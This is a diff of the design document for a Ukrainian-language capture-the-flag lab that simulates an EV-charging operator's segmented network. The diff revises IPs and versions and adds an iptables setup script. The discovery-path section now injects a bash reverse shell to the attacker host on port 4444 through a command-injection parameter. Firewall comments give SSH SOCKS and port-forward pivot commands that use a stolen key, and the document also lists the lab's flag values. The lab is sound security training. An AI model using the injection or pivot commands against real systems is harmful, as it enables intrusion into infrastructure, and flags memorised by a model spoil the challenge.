@@ -37,7 +37,7 @@ graph TB
     classDef ot fill:#f3e5f5,stroke:#9c27b0,stroke-width:2px,color:#000
 
     subgraph Zone0["🌐 ZONE 0: INTERNET"]
-        Attacker["👤 Attacker<br/>Kali Linux<br/>192.168.125.100"]:::attacker
+        Attacker["👤 Attacker<br/>Kali Linux<br/>192.168.125.228"]:::attacker
     end
 
     subgraph Zone1["🌍 ZONE 1: FRONTEND"]
@@ -86,10 +86,10 @@ graph TB
 | Зона | CIDR | VLAN | Gateway | Призначення | Правила доступу |
 |------|------|------|---------|-------------|-----------------|
 | **Internet** | 192.168.125.0/24 | WAN | ISP Router | Мережа атакуючого | ✅ Access to Frontend only<br/>❌ All other zones blocked |
-| **Frontend** | 192.168.250.0/24 | 50 | 192.168.250.1 | Публічний веб-сайт EcoCharge | ✅ To DMZ (ports 8080, 22)<br/>❌ To Internal/OT (DROP) |
-| **DMZ** | 192.168.100.0/24 | 20 | 192.168.100.1 | Управління та моніторинг | ✅ From Frontend<br/>✅ To Internal (specific ports)<br/>✅ To OT (via Jump Host) |
-| **Internal** | 192.168.20.0/24 | 30 | 192.168.20.1 | CitrineOS CSMS | ✅ From DMZ only<br/>✅ To OT (OCPP WebSocket) |
-| **OT** | 172.16.0.0/24 | 40 | 172.16.0.1 | Зарядні станції (EVerest) | ✅ To CSMS only<br/>✅ From Jump Host (maintenance) |
+| **Frontend** | 192.168.250.0/24 | 50 | 192.168.250.11 | Публічний веб-сайт EcoCharge | ✅ To DMZ (ports 8080, 22)<br/>❌ To Internal/OT (DROP) |
+| **DMZ** | 192.168.100.0/24 | 20 | 192.168.100.11 | Управління та моніторинг | ✅ From Frontend<br/>✅ To Internal (specific ports)<br/>✅ To OT (via Jump Host) |
+| **Internal** | 192.168.20.0/24 | 30 | 192.168.20.11 | CitrineOS CSMS | ✅ From DMZ only<br/>✅ To OT (OCPP WebSocket) |
+| **OT** | 172.16.0.0/24 | 40 | 172.16.0.11 | Зарядні станції (EVerest) | ✅ To CSMS only<br/>✅ From Jump Host (maintenance) |
 
 ---
 
@@ -97,7 +97,7 @@ graph TB
 
 ### 3.1 Zone 0: Internet (Attacker Network)
 
-#### 👤 Kali Linux (192.168.125.100)
+#### 👤 Kali Linux (192.168.125.228)
 
 | Параметр | Значення |
 |----------|----------|
@@ -121,9 +121,9 @@ graph TB
 
 | Параметр | Значення |
 |----------|----------|
-| **OS** | Ubuntu 22.04 LTS |
+| **OS** | Ubuntu 24.04 LTS |
 | **Stack** | Next.js 14.2.5 / React 18.3.1 / Node.js 20 |
-| **Ports** | 80 (HTTP), 443 (HTTPS), 3000 (Next.js) |
+| **Ports** | 80 (HTTP), 443 (HTTPS), 3000 (Next.js), 8080 (service) |
 | **Hostname** | ecocharge-web |
 
 **Функціональність:**
@@ -138,7 +138,7 @@ graph TB
 | # | Тип | Location | Опис |
 |---|-----|----------|------|
 | 1 | **CWE-78: Command Injection** | `/api/qr` | Parameter `station` не санітизується перед використанням в shell command |
-| 2 | **CWE-78: Command Injection** | `/opt/maintenance/backup.js` | Environment variable `BACKUP_TARGET` injection через sudo script |
+| 2 | **CWE-78: Command Injection** | `/opt/maintenance/backup.js` | File with write and execute permissions - backup.js |
 | 3 | **Information Disclosure** | `.env`, `/root/.ssh/` | Витік credentials та SSH ключів |
 
 **Discovery Path для Command Injection:**
@@ -148,7 +148,7 @@ graph TB
 3. В DevTools бачить: GET /api/qr?station=EV-CH-001&format=png
 4. Тестує: /api/qr?station=EV-CH-001&format=pdf
 5. Отримує debug info з command template
-6. Інжектує: /api/qr?station=EV-CH-001;id&format=png
+6. Інжектує: /api/qr?station=EV-CH-001;bash+-c+'bash+-i+>%26+/dev/tcp/192.168.125.228/4444+0>%261';%23&format=png"
 7. RCE!
 ```
 
@@ -167,7 +167,7 @@ graph TB
 
 | Параметр | Значення |
 |----------|----------|
-| **OS** | Ubuntu 22.04 |
+| **OS** | Ubuntu 24.04 |
 | **Stack** | Node.js 20 + Express |
 | **Port** | 8080 |
 | **Process Manager** | PM2 |
@@ -205,7 +205,7 @@ graph TB
 
 **Функціональність:**
 - Моніторинг інфраструктури EcoCharge
-- Візуалізація метрик CSMS
+- Візуалізація метрик CSMS та серверу
 - Dashboard зі статусом зарядних станцій
 
 **Вразливості:**
@@ -225,7 +225,7 @@ graph TB
 
 | Параметр | Значення |
 |----------|----------|
-| **OS** | Ubuntu 22.04 |
+| **OS** | Ubuntu 24.04 |
 | **Role** | Multi-homed bastion host |
 | **User** | `operator` |
 
@@ -233,9 +233,9 @@ graph TB
 
 | Interface | IP Address | Network | Purpose |
 |-----------|------------|---------|---------|
-| eth0 | 192.168.100.40/24 | DMZ | Access from Frontend |
-| eth1 | 192.168.20.40/24 | Internal | Access to CSMS |
-| eth2 | 172.16.0.10/24 | OT | Access to Chargers |
+| ens3 | 192.168.100.40/24 | DMZ | Access from Frontend |
+| via Firewall | 192.168.20.40/24 | Internal | Access to CSMS |
+| via Firewall | 172.16.0.10/24 | OT | Access to Chargers |
 
 **Функціональність:**
 - SSH bastion для адміністраторів
@@ -265,7 +265,7 @@ graph TB
 | Параметр | Значення |
 |----------|----------|
 | **Platform** | CitrineOS |
-| **UI Stack** | Next.js 15.1.2 / React 19.x |
+| **UI Stack** | Next.js 15.2.4 / React 19.x |
 | **API** | Hasura GraphQL Engine |
 | **Database** | PostgreSQL 16 |
 | **Message Broker** | RabbitMQ |
@@ -276,8 +276,9 @@ graph TB
 |------|---------|----------|
 | 3000 | Operator UI | HTTP (Next.js) |
 | 8080 | CSMS Core API | HTTP (REST) |
+| 8081 | OCPP 2.0.1 | WebSocket |
 | 8090 | Hasura GraphQL | HTTP |
-| 8092 | OCPP 2.0.1 | WebSocket |
+| 8092 | OCPP 1.6 | WebSocket |
 | 5432 | PostgreSQL | TCP |
 | 9090 | Prometheus | HTTP |
 
@@ -287,13 +288,13 @@ graph TB
 |---|---------|----------|-------------|
 | 1 | **CVE-2025-55182** | Critical (10.0) | React Server Components RCE (React2Shell) |
 | 2 | **CWE-526** | High | Environment variables exposure via /proc |
-| 3 | **Weak Secrets** | Medium | Default/weak HASURA_ADMIN_SECRET |
+| 3 | **OCPP 1.6** | High | With sniffing can find charging RFID token |
 
 **CVE-2025-55182 Details:**
-- **Affected:** Next.js 15.1.2 with React 19.x
+- **Affected:** Next.js 15.2.4 with React 19.x
 - **Type:** Unsafe Deserialization → Pre-auth RCE
 - **Vector:** Malicious HTTP POST to any Server Action endpoint
-- **Impact:** Full container compromise
+- **Impact:** Full compromise
 
 **Credentials:**
 
@@ -308,8 +309,8 @@ graph TB
 | Flag | Value | Method |
 |------|-------|--------|
 | #7 | `FLAG{r34ct2sh3ll_csms_pwn3d}` | CVE-2025-55182 RCE |
-| #8 | `FLAG{h4sur4_s3cr3t_l34k3d}` | Environment leak |
-| #9 | `FLAG{full_csms_c0mpr0m1s3}` | Database access via GraphQL |
+| #8 | `FLAG{h4sur4_s3cr3t_l34k3d}` | DB compromise |
+| #9 | `FLAG{full_csms_c0mpr0m1s3}` | FINAL FLAG - Secret Partner or Token |
 
 ---
 
@@ -366,87 +367,243 @@ graph TB
 ### 4.2 Ключові правила (iptables)
 
 ```bash
+echo "╔════════════════════════════════════════════════════════════════════╗"
+echo "║        EcoCharge CTF - Firewall Configuration v4.2                 ║"
+echo "╚════════════════════════════════════════════════════════════════════╝"
+
+if [ "$EUID" -ne 0 ]; then
+    echo "❌ Please run as root"
+    exit 1
+fi
+
+# ============================================================================
+# VARIABLES
+# ============================================================================
+IF_EXT="ens3"       # External/Internet
+IF_INTERNAL="ens4"  # Internal/CSMS
+IF_OT="ens5"        # OT Network
+IF_DMZ="ens6"       # DMZ
+IF_FRONTEND="ens7"  # Frontend
+
+WEB_PORTAL="192.168.250.50"
+API_GATEWAY="192.168.100.20"
+GRAFANA="192.168.100.30"
+JUMP_HOST="192.168.100.40"
+CSMS="192.168.20.20"
+CP001="172.16.0.40"
+CP002="172.16.0.60"
+
+# ============================================================================
+# FLUSH ALL RULES
+# ============================================================================
+echo "[*] Flushing all rules..."
+iptables -F
+iptables -X
+iptables -t nat -F
+iptables -t nat -X
+iptables -t mangle -F
+iptables -t mangle -X
+
 # ============================================================================
 # DEFAULT POLICIES
 # ============================================================================
+echo "[*] Setting default policies..."
 iptables -P INPUT DROP
 iptables -P FORWARD DROP
 iptables -P OUTPUT ACCEPT
 
 # ============================================================================
-# ZONE 0 → ZONE 1 (Internet → Frontend)
+# ENABLE IP FORWARDING
 # ============================================================================
-# Дозволити HTTP/HTTPS до Web Server
-iptables -A FORWARD -i eth0 -o eth1 \
-    -d 192.168.250.50 -p tcp -m multiport --dports 80,443,3000 -j ACCEPT
+echo "[*] Enabling IP forwarding..."
+echo 1 > /proc/sys/net/ipv4/ip_forward
+sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1
 
 # ============================================================================
-# ZONE 1 → ZONE 2 (Frontend → DMZ)
+# INPUT CHAIN
 # ============================================================================
-# Web Server → API Gateway
-iptables -A FORWARD -i eth1 -o eth2 \
-    -s 192.168.250.50 -d 192.168.100.20 -p tcp --dport 8080 -j ACCEPT
-
-# Web Server → Jump Host (SSH)
-iptables -A FORWARD -i eth1 -o eth2 \
-    -s 192.168.250.50 -d 192.168.100.40 -p tcp --dport 22 -j ACCEPT
-
-# Web Server → Internal/OT: BLOCKED
-iptables -A FORWARD -i eth1 -o eth3 -j DROP
-iptables -A FORWARD -i eth1 -o eth4 -j DROP
+echo "[*] Configuring INPUT chain..."
+iptables -A INPUT -i lo -j ACCEPT
+iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
+iptables -A INPUT -p icmp -j ACCEPT
+iptables -A INPUT -p tcp --dport 22 -j ACCEPT
 
 # ============================================================================
-# ZONE 2 → ZONE 3 (DMZ → Internal)
+# FORWARD CHAIN
 # ============================================================================
-# API Gateway → CSMS (GraphQL)
-iptables -A FORWARD -i eth2 -o eth3 \
-    -s 192.168.100.20 -d 192.168.20.20 -p tcp --dport 8090 -j ACCEPT
+echo "[*] Configuring FORWARD chain..."
 
-# Grafana → CSMS (Prometheus)
-iptables -A FORWARD -i eth2 -o eth3 \
-    -s 192.168.100.30 -d 192.168.20.20 -p tcp --dport 9090 -j ACCEPT
+# Stateful - MUST BE FIRST!
+iptables -A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT
 
-# Jump Host → Internal (full access for admin)
-iptables -A FORWARD -i eth2 -o eth3 \
-    -s 192.168.100.40 -j ACCEPT
+# ────────────────────────────────────────────────────────────────────────────
+# EXTERNAL (ens3) → FRONTEND (ens7)
+# ────────────────────────────────────────────────────────────────────────────
+echo "  [+] External → Frontend"
+
+# Web Portal стандартні порти
+iptables -A FORWARD -i $IF_EXT -o $IF_FRONTEND -d $WEB_PORTAL -p tcp --dport 80  -j ACCEPT
+iptables -A FORWARD -i $IF_EXT -o $IF_FRONTEND -d $WEB_PORTAL -p tcp --dport 443 -j ACCEPT
+iptables -A FORWARD -i $IF_EXT -o $IF_FRONTEND -d $WEB_PORTAL -p tcp --dport 3000 -j ACCEPT
+
+# [v4.2] SOCKS proxy або SSH port-forward, який учасник відкриває після PrivEsc.
+# Після отримання root shell на web-panel виконується:
+#   ssh -i /root/.ssh/id_jumphost -D 0.0.0.0:8080 operator@192.168.100.40 -N -f
+# або варіант з port forwarding:
+#   ssh -i /root/.ssh/id_jumphost -L 0.0.0.0:8080:192.168.100.30:3000 operator@192.168.100.40 -N -f
+# Kali звертається до http://192.168.250.50:8080 як до проксі або тунелю.
+iptables -A FORWARD -i $IF_EXT -o $IF_FRONTEND -d $WEB_PORTAL -p tcp --dport 8080 -j ACCEPT
+
+# ICMP для діагностики
+iptables -A FORWARD -i $IF_EXT -o $IF_FRONTEND -d $WEB_PORTAL -p icmp -j ACCEPT
+
+# ────────────────────────────────────────────────────────────────────────────
+# EXTERNAL (ens3) → DMZ/INTERNAL/OT - BLOCKED
+# Kali не може напряму бачити внутрішні мережі — це змушує учасника
+# будувати тунелі через скомпрометований web-panel.
+# ────────────────────────────────────────────────────────────────────────────
+echo "  [+] External → DMZ/Internal/OT: BLOCKED"
+iptables -A FORWARD -i $IF_EXT -o $IF_DMZ      -j DROP
+iptables -A FORWARD -i $IF_EXT -o $IF_INTERNAL -j DROP
+iptables -A FORWARD -i $IF_EXT -o $IF_OT       -j DROP
+
+# ────────────────────────────────────────────────────────────────────────────
+# FRONTEND (ens7) → DMZ (ens6)
+# ────────────────────────────────────────────────────────────────────────────
+echo "  [+] Frontend → DMZ"
+
+# Web Portal → API Gateway (для curl запитів після отримання API ключа)
+iptables -A FORWARD -i $IF_FRONTEND -o $IF_DMZ -s $WEB_PORTAL -d $API_GATEWAY -p tcp --dport 8080 -j ACCEPT
+
+# Web Portal → Jump Host SSH
+# Використовується для: ssh -i id_jumphost operator@192.168.100.40
+# та для всіх варіантів тунелів (-L, -D, -R)
+iptables -A FORWARD -i $IF_FRONTEND -o $IF_DMZ -s $WEB_PORTAL -d $JUMP_HOST -p tcp --dport 22 -j ACCEPT
+
+# [v4.2] Web Portal → Grafana порт 3000
+# Використовується при SSH Local Port Forwarding:
+#   ssh -L 0.0.0.0:8080:192.168.100.30:3000 operator@192.168.100.40 -N
+# SSH демон на Jump Host відкриває з'єднання до Grafana від свого імені,
+# але ці пакети виходять з web-panel до DMZ.
+iptables -A FORWARD -i $IF_FRONTEND -o $IF_DMZ -s $WEB_PORTAL -d $GRAFANA -p tcp --dport 3000 -j ACCEPT
+
+# ICMP
+iptables -A FORWARD -i $IF_FRONTEND -o $IF_DMZ -s $WEB_PORTAL -p icmp -j ACCEPT
+
+# ────────────────────────────────────────────────────────────────────────────
+# FRONTEND (ens7) → INTERNAL/OT - BLOCKED
+# Web Portal не може напряму дотягнутись до CSMS або зарядників.
+# ────────────────────────────────────────────────────────────────────────────
+echo "  [+] Frontend → Internal/OT: BLOCKED"
+iptables -A FORWARD -i $IF_FRONTEND -o $IF_INTERNAL -j DROP
+iptables -A FORWARD -i $IF_FRONTEND -o $IF_OT       -j DROP
+
+# ────────────────────────────────────────────────────────────────────────────
+# FRONTEND (ens7) → EXTERNAL (ens3)
+# ────────────────────────────────────────────────────────────────────────────
+echo "  [+] Frontend → External (outbound)"
+iptables -A FORWARD -i $IF_FRONTEND -o $IF_EXT -j ACCEPT
+
+# ────────────────────────────────────────────────────────────────────────────
+# DMZ (ens6) → FRONTEND (ens7)
+# ────────────────────────────────────────────────────────────────────────────
+echo "  [+] DMZ → Frontend"
+
+# [v4.2] Jump Host → Web Portal порт 8080
+# При SSH Remote Port Forwarding або при зворотньому з'єднанні в контексті
+# SOCKS тунелю, Jump Host може ініціювати з'єднання назад до web-panel.
+# Також потрібно для коректної роботи деяких варіантів SSH тунелів.
+iptables -A FORWARD -i $IF_DMZ -o $IF_FRONTEND -s $JUMP_HOST -d $WEB_PORTAL -p tcp --dport 8080 -j ACCEPT
+
+# ICMP
+iptables -A FORWARD -i $IF_DMZ -o $IF_FRONTEND -p icmp -j ACCEPT
+
+# ────────────────────────────────────────────────────────────────────────────
+# DMZ (ens6) → INTERNAL (ens4)
+# ────────────────────────────────────────────────────────────────────────────
+echo "  [+] DMZ → Internal"
+
+# API Gateway → CSMS
+iptables -A FORWARD -i $IF_DMZ -o $IF_INTERNAL -s $API_GATEWAY -d $CSMS -p tcp --dport 8080 -j ACCEPT
+iptables -A FORWARD -i $IF_DMZ -o $IF_INTERNAL -s $API_GATEWAY -d $CSMS -p tcp --dport 8090 -j ACCEPT
+
+# Grafana → CSMS Prometheus
+iptables -A FORWARD -i $IF_DMZ -o $IF_INTERNAL -s $GRAFANA -d $CSMS -p tcp --dport 9090 -j ACCEPT
+
+# Jump Host → CSMS (full access)
+# Через тут проходить SOCKS трафік після pivoting:
+# все що йде через ssh -D ... потрапляє сюди
+iptables -A FORWARD -i $IF_DMZ -o $IF_INTERNAL -s $JUMP_HOST -d $CSMS -j ACCEPT
+
+# ICMP
+iptables -A FORWARD -i $IF_DMZ -o $IF_INTERNAL -p icmp -j ACCEPT
+
+# ────────────────────────────────────────────────────────────────────────────
+# DMZ (ens6) → OT (ens5) - тільки Jump Host
+# ────────────────────────────────────────────────────────────────────────────
+echo "  [+] DMZ → OT (Jump Host only)"
+iptables -A FORWARD -i $IF_DMZ -o $IF_OT -s $JUMP_HOST -j ACCEPT
+iptables -A FORWARD -i $IF_DMZ -o $IF_OT -j DROP
+
+# ────────────────────────────────────────────────────────────────────────────
+# DMZ (ens6) → EXTERNAL (ens3)
+# ────────────────────────────────────────────────────────────────────────────
+echo "  [+] DMZ → External (outbound)"
+iptables -A FORWARD -i $IF_DMZ -o $IF_EXT -j ACCEPT
+
+# ────────────────────────────────────────────────────────────────────────────
+# INTERNAL (ens4) → OT (ens5)
+# ────────────────────────────────────────────────────────────────────────────
+echo "  [+] Internal → OT (OCPP)"
+iptables -A FORWARD -i $IF_INTERNAL -o $IF_OT -s $CSMS -j ACCEPT
+
+# ────────────────────────────────────────────────────────────────────────────
+# INTERNAL (ens4) → EXTERNAL (ens3)
+# ────────────────────────────────────────────────────────────────────────────
+echo "  [+] Internal → External (outbound)"
+iptables -A FORWARD -i $IF_INTERNAL -o $IF_EXT -j ACCEPT
+
+# ────────────────────────────────────────────────────────────────────────────
+# OT (ens5) → INTERNAL (ens4) - Зарядники → CSMS (OCPP)
+# ────────────────────────────────────────────────────────────────────────────
+echo "  [+] OT → Internal (OCPP)"
+iptables -A FORWARD -i $IF_OT -o $IF_INTERNAL -d $CSMS -p tcp --dport 8080 -j ACCEPT
+iptables -A FORWARD -i $IF_OT -o $IF_INTERNAL -d $CSMS -p tcp --dport 8081 -j ACCEPT
+iptables -A FORWARD -i $IF_OT -o $IF_INTERNAL -d $CSMS -p tcp --dport 8092 -j ACCEPT
+iptables -A FORWARD -i $IF_OT -o $IF_INTERNAL -p icmp -j ACCEPT
+
+# ────────────────────────────────────────────────────────────────────────────
+# OT (ens5) → EXTERNAL/DMZ - BLOCKED (air-gapped)
+# ────────────────────────────────────────────────────────────────────────────
+echo "  [+] OT → External/DMZ: BLOCKED"
+iptables -A FORWARD -i $IF_OT -o $IF_EXT -j DROP
+iptables -A FORWARD -i $IF_OT -o $IF_DMZ -j DROP
+
+# ────────────────────────────────────────────────────────────────────────────
+# DEFAULT LOG
+# ────────────────────────────────────────────────────────────────────────────
+iptables -A FORWARD -j LOG --log-prefix "FW_DROP: " --log-level 4
 
 # ============================================================================
-# ZONE 3 → ZONE 4 (Internal → OT)
+# NAT
 # ============================================================================
-# CSMS → Chargers (OCPP WebSocket)
-iptables -A FORWARD -i eth3 -o eth4 \
-    -s 192.168.20.20 -p tcp -m multiport --dports 8080,8092 -j ACCEPT
+echo "[*] Configuring NAT..."
+iptables -t nat -A POSTROUTING -o $IF_EXT -j MASQUERADE
 
 # ============================================================================
-# ZONE 4 → ZONE 3 (OT → Internal)
+# SAVE RULES
 # ============================================================================
-# Chargers → CSMS (OCPP connect)
-iptables -A FORWARD -i eth4 -o eth3 \
-    -d 192.168.20.20 -p tcp -m multiport --dports 8080,8092 -j ACCEPT
+echo "[*] Saving rules..."
+mkdir -p /etc/iptables
+iptables-save > /etc/iptables/rules.v4
 
-# ============================================================================
-# ZONE 2 → ZONE 4 (DMZ → OT) - ONLY JUMP HOST
-# ============================================================================
-# Jump Host → OT network (maintenance)
-iptables -A FORWARD -i eth2 -o eth4 \
-    -s 192.168.100.40 -j ACCEPT
-
-# ============================================================================
-# ESTABLISHED CONNECTIONS
-# ============================================================================
-iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT
-
-# ============================================================================
-# LOGGING
-# ============================================================================
-iptables -A FORWARD -j LOG --log-prefix "FW-DROP: " --log-level 4
 ```
 
 ### 4.3 Таблиця дозволених з'єднань
 
 | Source Zone | Destination Zone | Allowed Ports | Purpose |
 |-------------|------------------|---------------|---------|
-| Internet | Frontend | 80, 443, 3000 | HTTP/HTTPS to Web Server |
+| Internet | Frontend | 80, 443, 3000, 8080 | HTTP/HTTPS to Web Server |
 | Frontend | DMZ (API GW) | 8080 | API requests |
 | Frontend | DMZ (Jump) | 22 | SSH pivot |
 | DMZ (API) | Internal (CSMS) | 8090 | GraphQL proxy |
@@ -508,7 +665,7 @@ FLAGS #1,#2,#3    FLAG #4,#5          FLAG #6        FLAGS #7,#8,#9
 |-----------|---------|
 | Hypervisor | Proxmox VE 8.x / VMware ESXi 8.x |
 | Container Runtime | Docker 24.x |
-| Host OS | Ubuntu 22.04 LTS |
+| Host OS | Ubuntu 24.04 LTS |
 
 ### 6.3 VM Allocation
 
@@ -541,7 +698,7 @@ FLAGS #1,#2,#3    FLAG #4,#5          FLAG #6        FLAGS #7,#8,#9
 
 ### Навчальна цінність:
 
-Сценарій демонструє повний ланцюжок атаки від web exploitation через сучасну вразливість (CVE-2025-55182) до повного контролю над системою управління критичною інфраструктурою, що є важливим для розуміння захисту EV charging infrastructure.
+Сценарій демонструє повний ланцюжок атаки: від OS Command Injection (CWE-78) у веб-порталі через privilege escalation (некоректна sudo-конфігурація), credential harvesting з незахищених конфігураційних файлів, SSH tunneling та SOCKS proxying для обходу сегментації мереж — до експлуатації CVE-2025-55182 у Next.js та повного доступу до бази даних CSMS через Hasura GraphQL API. Це дозволяє учасникам на практиці зрозуміти, як помилки на кожному рівні захисту складаються в єдиний вектор компрометації критичної інфраструктури EV charging.
 
 ---
 
